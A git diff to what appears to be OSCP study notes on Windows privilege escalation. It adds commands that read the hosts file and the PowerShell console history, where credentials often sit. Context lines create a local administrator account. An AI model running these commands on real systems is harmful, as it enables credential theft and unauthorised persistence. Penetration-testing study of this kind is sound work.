@@ -330,6 +330,11 @@ https://0xsp.com/offensive/privilege-escalation-cheatsheet
 [Powershell cheat sheet](/OSCP/POWERSHELL.md)  
 https://cheatography.com/blacklist/cheat-sheets/linux-windows-privilege-escalation/
 
+### Common places to look for
+
+	type C:\WINDOWS\System32\drivers\etc\hosts
+	type \users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\consolehost_history.txt
+
 ### Get system informations
 
 		systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
@@ -362,7 +367,6 @@ https://cheatography.com/blacklist/cheat-sheets/linux-windows-privilege-escalati
 		net user rottenadmin P@ssword123! /add
 		net localgroup Administrators rottenadmin /add
 
-		type C:\WINDOWS\System32\drivers\etc\hosts
 
 ### Get network/shares informations
 
